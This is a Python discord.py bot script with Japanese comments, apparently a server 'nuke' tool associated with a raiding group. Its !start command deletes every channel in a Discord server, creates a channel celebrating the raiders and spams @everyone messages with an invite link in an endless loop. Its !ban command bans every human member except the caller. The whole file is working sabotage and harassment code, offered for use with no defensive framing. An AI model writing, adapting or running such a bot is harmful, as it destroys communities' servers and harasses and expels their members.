VortexJPimport discord
from discord.ext import commands

# ボットトークンをここに直接記述
TOKEN = 'your_bot_token_here'

# ボットの初期化
intents = discord.Intents.default()
intents.guilds = True  # ギルド関連のインテントを有効化
intents.messages = True  # メッセージ関連のインテントを有効化
intents.members = True  # メンバー関連のインテントを有効化
bot = commands.Bot(command_prefix='!', intents=intents)

# メッセージを永遠に送信するためのフラグ
sending_messages = False

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}!')

# チャンネルをすべて削除して新しいチャンネルを作成するコマンド
@bot.command()
async def start(ctx):
    global sending_messages

    # すべてのテキストチャンネルを削除
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f'Deleted channel: {channel.name}')
        except Exception as e:
            print(f'Failed to delete channel: {channel.name}, Error: {e}')

    # 新しいチャンネルを作成
    try:
        new_channel = await ctx.guild.create_text_channel('荒らし共栄圏万歳')
        print('Created new channel: 荒らし共栄圏万歳')
        
        # メッセージの連続送信を開始
        sending_messages = True
        await send_messages_forever(new_channel)
        
    except Exception as e:
        print(f'Failed to create or send message in the new channel: {e}')

async def send_messages_forever(channel):
    """指定されたチャンネルに改行を含むメッセージを間隔なしで永遠に送信し続ける"""
    while sending_messages:
        try:
            message = '@everyone \nあなたのさばは荒らし共栄圏（CTKP）に負けました。Discord.gg/ctkp'
            await channel.send(message)
            print('Sent message with line breaks.')
        except Exception as e:
            print(f'Failed to send message: {e}')

# すべてのメンバーをBANするコマンド
@bot.command()
async def ban(ctx):
    for member in ctx.guild.members:
        if member != ctx.author and not member.bot:  # 自分自身とボットはBANしない
            try:
                await member.ban(reason="All members are being banned by the !ban command")
                print(f'Banned member: {member.name}')
            except Exception as e:
                print(f'Failed to ban member: {member.name}, Error: {e}')

# ボットの起動
bot.run(TOKEN)
